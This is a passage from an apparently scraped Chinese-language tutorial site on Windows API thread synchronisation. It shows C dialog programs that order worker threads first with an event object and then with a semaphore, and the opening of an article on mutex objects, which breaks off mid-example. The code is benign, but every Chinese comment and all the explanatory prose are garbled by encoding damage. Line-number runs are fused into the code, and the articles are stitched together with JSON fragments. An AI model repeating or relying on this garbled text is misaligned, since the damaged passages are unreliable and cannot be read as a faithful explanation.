g_hEditSecondary2 = NULL;HWND g_hEditSecondary3 = NULL;HANDLE g_hEvent = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆå§‹åŒ–çš„æ¶ˆæ¯ &#123; g_hEditPrimary = GetDlgItem(hwndDlg, IDC_EDIT_PRIMARY); g_hEditSecondary1 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY1); g_hEditSecondary2 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY2); g_hEditSecondary3 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY3); SetWindowText(g_hEditPrimary, TEXT(&quot;0&quot;)); //è®¾ç½®æ‰€æœ‰ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤º0 SetWindowText(g_hEditSecondary1, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary2, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary3, TEXT(&quot;0&quot;)); return TRUE; &#125; case WM_COMMAND: //å­çª—å£æ¶ˆæ¯ switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: //IDC_BUTTON_STARTæŒ‰é’® HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ä½œä¸ºå·¥ä½œçº¿ç¨‹ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//å·¥ä½œçº¿ç¨‹DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; // åˆ›å»ºæ‰‹åŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡ g_hEvent = CreateEvent( NULL, // ä½¿ç”¨é»˜è®¤å®‰å…¨å±æ€§ TRUE, // æ‰‹åŠ¨é‡ç½® FALSE, // åˆå§‹ä¸ºæ— ä¿¡å·çŠ¶æ€ NULL // NULL åŒ¿åå¯¹è±¡ ); //å…ˆé€’å¢çš„çº¿ç¨‹ HANDLE hPrimaryThread = CreateThread(NULL, 0, PrimaryThreadProc, g_hEditPrimary, 0, NULL); CloseHandle(hPrimaryThread); //åé€’å¢çš„çº¿ç¨‹ HANDLE hSecondaryThreads[3] = &#123; NULL &#125;; hSecondaryThreads[0] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary1, 0, NULL); //çº¿ç¨‹1 hSecondaryThreads[1] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary2, 0, NULL); //çº¿ç¨‹2 hSecondaryThreads[2] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary3, 0, NULL); //çº¿ç¨‹3 WaitForMultipleObjects(3, hSecondaryThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hSecondaryThreads[i]); &#125; CloseHandle(g_hEvent); return 0;&#125;//å…ˆé€’å¢çš„çº¿ç¨‹DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // æ•°å­—è½¬å­—ç¬¦ ++dwCount; SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ Sleep(100); // ç¡çœ ä¸€ä¸‹ï¼Œæ˜¾ç¤ºæ•ˆæœå¥½ &#125; // è®¾ç½®äº‹ä»¶å¯¹è±¡ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œé€šçŸ¥å…¶ä»–çº¿ç¨‹ SetEvent(g_hEvent); return 0;&#125;//åé€’å¢çš„çº¿ç¨‹DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; // ç­‰å¾…äº‹ä»¶å¯¹è±¡è¢«è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ WaitForSingleObject(g_hEvent, INFINITE); //çº¿ç¨‹å‡½æ•°ä¸æ”¾å¼€å¤´ï¼Œé˜²æ­¢é™ä½ç¨‹åºæ•ˆç‡ while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // æ•°å­—è½¬å­—ç¬¦ ++dwCount; SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ Sleep(100); // ç¡çœ ä¸€ä¸‹ï¼Œæ˜¾ç¤ºæ•ˆæœå¥½ &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include &lt;Windows.h&gt;#include &quot;resource.h&quot;#include &lt;stdio.h&gt;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter);DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter);HWND g_hEditPrimary = NULL;HWND g_hEditSecondary1 = NULL;HWND g_hEditSecondary2 = NULL;HWND g_hEditSecondary3 = NULL;HANDLE g_hSemaphore = NULL;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆå§‹åŒ–çš„æ¶ˆæ¯ &#123; g_hEditPrimary = GetDlgItem(hwndDlg, IDC_EDIT_PRIMARY); g_hEditSecondary1 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY1); g_hEditSecondary2 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY2); g_hEditSecondary3 = GetDlgItem(hwndDlg, IDC_EDIT_SECONDARY3); SetWindowText(g_hEditPrimary, TEXT(&quot;0&quot;)); //è®¾ç½®æ‰€æœ‰ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤º0 SetWindowText(g_hEditSecondary1, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary2, TEXT(&quot;0&quot;)); SetWindowText(g_hEditSecondary3, TEXT(&quot;0&quot;)); return TRUE; &#125; case WM_COMMAND: //å­çª—å£æ¶ˆæ¯ switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: //IDC_BUTTON_STARTæŒ‰é’® HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ä½œä¸ºå·¥ä½œçº¿ç¨‹ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//å·¥ä½œçº¿ç¨‹DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; //// åˆ›å»ºæ‰‹åŠ¨é‡ç½®äº‹ä»¶å¯¹è±¡ //g_hEvent = CreateEvent( // NULL, // ä½¿ç”¨é»˜è®¤å®‰å…¨å±æ€§ // TRUE, // æ‰‹åŠ¨é‡ç½® // FALSE, // åˆå§‹ä¸ºæ— ä¿¡å·çŠ¶æ€ // NULL // NULL åŒ¿åå¯¹è±¡ //); // åˆ›å»ºä¿¡å·é‡ g_hSemaphore = CreateSemaphore( NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // åˆå§‹è®¡æ•° 3, // æœ€å¤§è®¡æ•° NULL // åŒ¿åä¿¡å·é‡ ); //å…ˆé€’å¢çš„çº¿ç¨‹ HANDLE hPrimaryThread = CreateThread(NULL, 0, PrimaryThreadProc, g_hEditPrimary, 0, NULL); CloseHandle(hPrimaryThread); //åé€’å¢çš„çº¿ç¨‹ HANDLE hSecondaryThreads[3] = &#123; NULL &#125;; hSecondaryThreads[0] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary1, 0, NULL); //çº¿ç¨‹1 hSecondaryThreads[1] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary2, 0, NULL); //çº¿ç¨‹2 hSecondaryThreads[2] = CreateThread(NULL, 0, SecondaryThreadProc, g_hEditSecondary3, 0, NULL); //çº¿ç¨‹3 WaitForMultipleObjects(3, hSecondaryThreads, TRUE, INFINITE); for (int i = 0; i &lt; 3; i++) &#123; CloseHandle(hSecondaryThreads[i]); &#125; //CloseHandle(g_hEvent); CloseHandle(g_hSemaphore); return 0;&#125;//å…ˆé€’å¢çš„çº¿ç¨‹DWORD WINAPI PrimaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ ++dwCount; Sleep(100); // ç¡çœ ä¸€ä¸‹ï¼Œæ˜¾ç¤ºæ•ˆæœå¥½ &#125; //// è®¾ç½®äº‹ä»¶å¯¹è±¡ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œé€šçŸ¥å…¶ä»–çº¿ç¨‹ //SetEvent(g_hEvent); // é‡Šæ”¾ä¿¡å·é‡ï¼Œå…è®¸åç»­çš„ä¸‰ä¸ªçº¿ç¨‹åŒæ—¶å¼€å§‹ ReleaseSemaphore( g_hSemaphore, // ä¿¡å·é‡å¥æŸ„ 3, // é€’å¢çš„ä¿¡å·é‡è®¡æ•°å€¼ NULL // æ—§çš„ä¿¡å·é‡è®¡æ•°å€¼ï¼ˆä¸éœ€è¦ï¼‰ ); return 0;&#125;//åé€’å¢çš„çº¿ç¨‹DWORD WINAPI SecondaryThreadProc(LPVOID lpParameter)&#123; HWND hEdit = (HWND)lpParameter; DWORD dwCount = 0; char buf[10] = &#123; 0 &#125;; // ç­‰å¾…äº‹ä»¶å¯¹è±¡è¢«è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ WaitForSingleObject(g_hSemaphore, INFINITE); //çº¿ç¨‹å‡½æ•°ä¸æ”¾å¼€å¤´ï¼Œé˜²æ­¢é™ä½ç¨‹åºæ•ˆç‡ while (dwCount &lt;= 50) &#123; sprintf(buf, &quot;%d&quot;, dwCount); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ ++dwCount; Sleep(100); // ç¡çœ ä¸€ä¸‹ï¼Œæ˜¾ç¤ºæ•ˆæœå¥½ &#125; ReleaseSemaphore(g_hSemaphore, 1, NULL); return 0;&#125;"},{"title":"äº’æ–¥ä½“ï¼ˆMutexï¼‰","path":"/wiki/Windows_API/äº’æ–¥ä½“.html","content":"å†…æ ¸çº§ä¸´ç•Œèµ„æºæ€ä¹ˆåŠï¼Ÿ ä¸Šä¸€èŠ‚è®²çš„çº¿ç¨‹é”åªèƒ½æ§åˆ¶åŒä¸€è¿›ç¨‹ä¸­ä¸åŒçº¿ç¨‹å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®ï¼Œå¦‚æœä¸´ç•Œèµ„æºæ˜¯å†…æ ¸çº§ï¼Œå³å¤šè¿›ç¨‹éƒ½èƒ½åŒæ—¶è®¿é—®è¯¥ä¸´ç•Œèµ„æºæ€ä¹ˆåŠï¼Ÿ é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªæ”¾åœ¨â€œå†…æ ¸ä¸­çš„ä»¤ç‰Œâ€æ¥æ§åˆ¶ã€‚Windowsæä¾›çš„äº’æ–¥é”ï¼ˆmutex objectï¼‰ï¼Œå°±æ˜¯ä¸€ä¸ªåœ¨å†…æ ¸ç§çš„å†…æ ¸å¯¹è±¡ï¼Œèƒ½è¢«å¤šè¿›ç¨‹è®¿é—®åˆ°ï¼Œæ¢å¥è¯è¯´ï¼Œèƒ½ç”¨æ¥æ§åˆ¶å¤šè¿›ç¨‹å¯¹å†…æ ¸ä¸´ç•Œèµ„æºçš„è®¿é—®ã€‚ çŸ¥è¯†è¯´æ˜ å‚è€ƒï¼š CreateMutexA Wait Functions WaitForSingleObject function ReleaseMutex function Mutex Objectsï¼ˆé‡ç‚¹çœ‹è¿™ä¸ªï¼Œå†™å¾—å¾ˆè¯¦ç»†äº†ï¼‰ Using Mutex Objectsï¼ˆä»£ç ç¤ºä¾‹ï¼‰ mutex object äº’æ–¥å¯¹è±¡ï¼ˆMutex Objectsï¼‰æ˜¯Windowsç¯å¢ƒä¸‹çš„ä¸€ä¸ªé‡è¦çš„å†…æ ¸å¯¹è±¡ï¼ˆKernel Objectï¼‰ï¼Œå®ƒè¢«ç”¨æ¥æ§åˆ¶åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®ã€‚äº’æ–¥å¯¹è±¡ç¡®ä¿åœ¨ä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¤Ÿè®¿é—®ç‰¹å®šçš„èµ„æºæˆ–ä»£ç æ®µï¼Œä»è€Œé¿å…äº†èµ„æºç«äº‰å’Œæ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ å½“ä¸€ä¸ªçº¿ç¨‹éœ€è¦è®¿é—®ç”±äº’æ–¥å¯¹è±¡ä¿æŠ¤çš„ä¸´ç•Œèµ„æºæ—¶ï¼Œå®ƒå¿…é¡»é¦–å…ˆé€šè¿‡è°ƒç”¨ç­‰å¾…å‡½æ•°ï¼ˆWait Functionsï¼‰æ¥è¯·æ±‚äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚è¿™äº›ç­‰å¾…å‡½æ•°åŒ…æ‹¬ WaitForSingleObject å’Œ WaitForMultipleObjectsã€‚å¦‚æœäº’æ–¥å¯¹è±¡å·²è¢«å¦ä¸€ä¸ªçº¿ç¨‹å æœ‰ï¼Œé‚£ä¹ˆè¯·æ±‚å®ƒçš„çº¿ç¨‹å°†ä¼šè¢«é˜»å¡ï¼ˆblockedï¼‰ï¼Œç›´åˆ°å æœ‰è¯¥äº’æ–¥å¯¹è±¡çš„çº¿ç¨‹é€šè¿‡è°ƒç”¨ ReleaseMutex å‡½æ•°æ¥é‡Šæ”¾ï¼ˆreleaseï¼‰å®ƒã€‚åœ¨é‡Šæ”¾åï¼Œå…¶ä»–çº¿ç¨‹æ‰æœ‰æœºä¼šè·å¾—è¯¥äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œå¹¶è®¿é—®ç›¸åº”çš„èµ„æºã€‚If more than one thread is waiting on a mutex, a waiting thread is selected. Do not assume a first-in, first-out (FIFO) order. External events such as kernel-mode APCs can change the wait order. åœ¨äº’æ–¥å¯¹è±¡çš„çŠ¶æ€æ–¹é¢ï¼Œå½“å®ƒæ²¡æœ‰è¢«ä»»ä½•çº¿ç¨‹æ‹¥æœ‰æ—¶ï¼Œäº’æ–¥å¯¹è±¡å¤„äºè§¦å‘çŠ¶æ€ï¼ˆsignaledï¼‰ã€‚ç›¸åï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è·å¾—äº†äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œäº’æ–¥å¯¹è±¡åˆ™å¤„äºéè§¦å‘çŠ¶æ€ï¼ˆnonsignaledï¼‰ã€‚è¿™äº›çŠ¶æ€å¯¹ç­‰å¾…å‡½æ•°çš„è¡Œä¸ºäº§ç”Ÿå½±å“ï¼šåªæœ‰å½“äº’æ–¥å¯¹è±¡å¤„äºè§¦å‘çŠ¶æ€æ—¶ï¼Œç­‰å¾…å‡½æ•°æ‰ä¼šå…è®¸å¦ä¸€ä¸ªçº¿ç¨‹è·å¾—æ‰€æœ‰æƒã€‚ å¦‚æœä¸€ä¸ªçº¿ç¨‹åœ¨æœªé‡Šæ”¾å…¶æ‰€æ‹¥æœ‰çš„äº’æ–¥å¯¹è±¡çš„æƒ…å†µä¸‹ç»ˆæ­¢ï¼Œè¯¥äº’æ–¥å¯¹è±¡ä¼šè¢«è§†ä¸ºé—å¼ƒçš„ï¼ˆabandonedï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç­‰å¾…è¯¥äº’æ–¥å¯¹è±¡çš„å…¶ä»–çº¿ç¨‹å¯ä»¥è·å¾—å…¶æ‰€æœ‰æƒï¼ˆå¦‚æœæ˜¯çº¿ç¨‹é”ï¼ŒEnterCriticalSectionåæ²¡æœ‰LeaveCriticalSectionï¼Œé‚£ä¹ˆå…¶ä»–çº¿ç¨‹å°±æ°¸è¿œæ— æ³•EnterCriticalSectionï¼Œä¼šä¸€ç›´é˜»å¡ï¼‰ï¼Œä½†ç­‰å¾…å‡½æ•°ï¼ˆå¦‚ WaitForSingleObjectï¼‰ä¼šè¿”å›ä¸€ä¸ªç‰¹æ®Šçš„å€¼ WAIT_ABANDONEDï¼ŒæŒ‡ç¤ºäº’æ–¥å¯¹è±¡å·²è¢«é—å¼ƒã€‚é—å¼ƒçš„äº’æ–¥å¯¹è±¡æ„å‘³ç€å‘ç”Ÿäº†é”™è¯¯ï¼Œå¹¶ä¸”äº’æ–¥å¯¹è±¡ä¿æŠ¤çš„ä»»ä½•å…±äº«èµ„æºéƒ½å¤„äºæœªå®šä¹‰çŠ¶æ€ã€‚å¦‚æœçº¿ç¨‹ç»§ç»­æ‰§è¡Œï¼Œå°±å¥½åƒäº’æ–¥å¯¹è±¡æ²¡æœ‰è¢«é—å¼ƒä¸€æ ·ï¼Œä¸€æ—¦è¯¥çº¿ç¨‹é‡Šæ”¾äº†å¯¹äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œäº’æ–¥å¯¹è±¡å°±ä¸å†è¢«è§†ä¸ºé—å¼ƒã€‚è¿™æ ·ï¼Œå¦‚æœç¨ååœ¨ç­‰å¾…å‡½æ•°ä¸­å†æ¬¡æŒ‡å®šè¯¥äº’æ–¥å¯¹è±¡çš„å¥æŸ„ï¼Œå®ƒå°†æ¢å¤æ­£å¸¸è¡Œä¸ºã€‚ï¼ˆåœ¨ä¸´ç•ŒåŒºä¸­æ„å¤–é€€å‡ºæ²¡æ¥å¾—åŠReleaseäº’æ–¥å¯¹è±¡çš„ä»£ç ç¤ºä¾‹åœ¨è¿™é‡Œï¼‰ ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ªä¸åŒçš„äº’æ–¥å¯¹è±¡ï¼Œä½†ä»»ä½•æ—¶å€™ä¸€ä¸ªäº’æ–¥å¯¹è±¡åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹æ‰€æ‹¥æœ‰ã€‚è¿™æ„å‘³ç€ï¼Œè™½ç„¶ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æ§åˆ¶å¯¹å¤šä¸ªèµ„æºçš„è®¿é—®ï¼Œä½†æ¯ä¸ªèµ„æºï¼ˆç”±ä¸åŒçš„äº’æ–¥å¯¹è±¡ä¿æŠ¤ï¼‰åœ¨åŒä¸€æ—¶åˆ»åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹è®¿é—®ã€‚ CreateMutex çº¿ç¨‹é€šè¿‡è°ƒç”¨CreateMutexæ¥åˆ›å»ºä¸€ä¸ªmutex objectã€‚ 12345HANDLE CreateMutexA( [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, // SD å®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦ [in] BOOL bInitialOwner, [in, optional] LPCSTR lpName // mutex object name äº’æ–¥ä½“çš„åå­—); å‚æ•° bInitialOwnerï¼Œå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåˆ›å»ºåçš„è¿™ä¸ªmutex objectæ˜¯å¦ç«‹å³ç”±è°ƒç”¨çº¿ç¨‹æ‰€æ‹¥æœ‰ï¼š TRUE å¦‚æœè¿™ä¸ªäº’æ–¥å¯¹è±¡æ˜¯ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºï¼Œé‚£ä¹ˆåˆ›å»ºå®ƒçš„çº¿ç¨‹ï¼ˆè°ƒç”¨ CreateMutex çš„çº¿ç¨‹ï¼‰ä¼šç«‹å³æˆä¸ºè¿™ä¸ªäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚ å¦‚æœè¿™ä¸ªäº’æ–¥å¯¹è±¡ä¹‹å‰å·²ç»è¢«åˆ›å»ºè¿‡ï¼ˆå³æ­¤æ—¶ CreateMutex å®é™…ä¸Šæ˜¯æ‰“å¼€ä¸€ä¸ªå·²å­˜åœ¨çš„äº’æ–¥å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆè°ƒç”¨çº¿ç¨‹ä¸ä¼šç«‹å³æˆä¸ºäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿ bInitialOwner è®¾ç½®ä¸º TRUEï¼Œè°ƒç”¨çº¿ç¨‹ä¹Ÿéœ€è¦é€šè¿‡ç­‰å¾…å‡½æ•°ï¼ˆå¦‚ WaitForSingleObjectï¼‰æ¥è¯·æ±‚äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚ FALSEï¼šè°ƒç”¨çº¿ç¨‹ä¸ä¼šç«‹å³è·å¾—äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚æ— è®ºè¯¥äº’æ–¥å¯¹è±¡æ˜¯å¦æ˜¯æ–°åˆ›å»ºçš„ï¼Œè°ƒç”¨çº¿ç¨‹éƒ½éœ€è¦ä½¿ç”¨ç­‰å¾…å‡½æ•°æ¥è¯·æ±‚æ‰€æœ‰æƒã€‚ åœ¨å¤šè¿›ç¨‹ç¯å¢ƒä¸­ï¼Œä¸åŒçš„è¿›ç¨‹å¯ä»¥åˆ›å»ºåŒåçš„äº’æ–¥å¯¹è±¡ã€‚å½“ä¸€ä¸ªäº’æ–¥å¯¹è±¡é¦–æ¬¡è¢«æŸä¸ªè¿›ç¨‹åˆ›å»ºæ—¶ï¼Œå®ƒæ˜¯æ–°åˆ›å»ºçš„ï¼›å¦‚æœåæ¥å¦ä¸€ä¸ªè¿›ç¨‹å°è¯•åˆ›å»ºåŒåçš„äº’æ–¥å¯¹è±¡ï¼ŒCreateMutex ä¼šè¿”å›å·²å­˜åœ¨çš„äº’æ–¥å¯¹è±¡çš„å¥æŸ„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå»ºè®®è®¾ç½® bInitialOwner æ ‡å¿—ä¸º FALSEã€‚è¿™æ ·ï¼Œæ— è®ºå“ªä¸ªè¿›ç¨‹æœ€å…ˆåˆ›å»ºäº’æ–¥å¯¹è±¡ï¼Œéƒ½ä¸ä¼šç«‹å³è·å¾—æ‰€æœ‰æƒï¼Œä»è€Œé¿å…äº†ä¸æ¸…æ¥šå“ªä¸ªè¿›ç¨‹å…ˆè·å¾—æ‰€æœ‰æƒçš„é—®é¢˜ã€‚è¿™æ ·åšæœ‰åŠ©äºä¿æŒæ‰€æœ‰æƒçš„æ˜ç¡®æ€§å’Œä¸€è‡´æ€§ï¼Œç‰¹åˆ«æ˜¯å½“ä½¿ç”¨å‘½åäº’æ–¥å¯¹è±¡æ¥å®ç°è·¨è¿›ç¨‹çš„èµ„æºè®¿é—®æ§åˆ¶æ—¶ã€‚ è¿”å›å€¼ å‡½æ•°è°ƒç”¨æˆåŠŸï¼š è¿™ä¸ªmutex objectæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œè¿”å›å€¼ä¸ºè¿™ä¸ªäº’æ–¥å¯¹è±¡çš„handle è¿™ä¸ªmutex objectå·²å­˜åœ¨ï¼Œè¿”å›å€¼ä¸ºè¿™ä¸ªå·²å­˜åœ¨äº’æ–¥å¯¹è±¡çš„handleã€‚GetLaseErrorè·å¾—çš„è¿”å›å€¼æ˜¯ERROR_ALREADY_EXISTS å‡½æ•°è°ƒç”¨å¤±è´¥ï¼š è¿”å›å€¼ä¸ºNULLã€‚è°ƒGetLaseErrorè·å¾—é¢å¤–ä¿¡æ¯ ä¾‹ ä¾‹å­ä¸­çš„äº’æ–¥å¯¹è±¡éƒ½æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»º bInitialOwnerè®¾ç½®ä¸ºTRUEbInitialOwnerè®¾ç½®ä¸ºFALSEbInitialOwnerè®¾ç½®ä¸ºTRUE1234567891011121314HANDLE hMutex = CreateMutex( // Create a mutex with initial owner NULL, // default security attributes TRUE, // initially owned by the calling thread &quot;XYZ&quot;); // named mutexï¼šâ€œXYZâ€// åå­—ä¸ºXYZçš„mutex objectæ˜¯ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºï¼Œåˆ›å»ºåç«‹å³è¢«calling threadæ‰€ä»¥æ‹¥æœ‰// æ‰€ä»¥è¯¥çº¿ç¨‹å¯ä»¥ç›´æ¥è®¿é—®ä¸´ç•Œèµ„æºï¼Œ// è€Œæ— éœ€è°ƒç”¨Wait Functions(å¦‚WaitForSingleObjectæˆ–WaitForMultipleObjects)å»è¯·æ±‚äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒ// å¦‚æœå†æ¬¡è°ƒç”¨WaitForSingleObject(hMutex, INFINITE)ï¼Œå› ä¸ºå½“å‰çº¿ç¨‹å·²æ‹¥æœ‰è¯¥äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œæ‰€ä»¥å‡½æ•°æ— éœ€ç­‰å¾…ï¼Œç«‹å³è¿”å›/*** è®¿é—®ä¸´ç•Œèµ„æº ***/ReleaseMutex(hMutex); // é‡Šæ”¾æ‰€æœ‰æƒï¼Œä¸é‡Šæ”¾çš„è¯å…¶ä»–çº¿ç¨‹ä¼šé˜»å¡åœ¨ç­‰å¾…å‡½æ•°ï¼Œå› ä¸ºè¯·æ±‚ä¸åˆ°mutex objectçš„æ‰€æœ‰æƒCloseHandle(hMutex); // mutex objectä¹Ÿæ˜¯å†…æ ¸å¯¹è±¡ï¼Œå…³é—­å¥æŸ„bInitialOwnerè®¾ç½®ä¸ºFALSE1234567891011121314HANDLE hMutex = CreateMutex( // Create a mutex with no initial owner NULL, // default security attributes FALSE, // initially not owned &quot;XYZ&quot;); // named mutexï¼šâ€œXYZâ€// æƒ…å†µä¸€ï¼šåå­—ä¸ºXYZçš„mutex objectæ˜¯ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºï¼Œåˆ›å»ºåæ²¡æœ‰æ‹¥æœ‰è€…ï¼Œå¤„äºsignaledçŠ¶æ€// æƒ…å†µäºŒï¼šåå­—ä¸ºXYZçš„mutex objectå·²å­˜åœ¨ï¼Œåˆ™CreateMutexè¿”å›çš„æ˜¯å·²å­˜åœ¨çš„mutex objectçš„handle// çº¿ç¨‹æƒ³ä½¿ç”¨çš„è¯éœ€è¦è°ƒWait Functionsæ¥è¯·æ±‚è¿™ä¸ªäº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œç„¶åæ‰èƒ½è®¿é—®ä¸´ç•Œèµ„æºWaitForSingleObject(hMutex, INFINITE); // ç­‰å¾…å–å¾—äº’æ–¥å¯¹è±¡çš„æ‹¥æœ‰æƒï¼Œå‡è®¾æ˜¯æ— é™ç­‰/*** 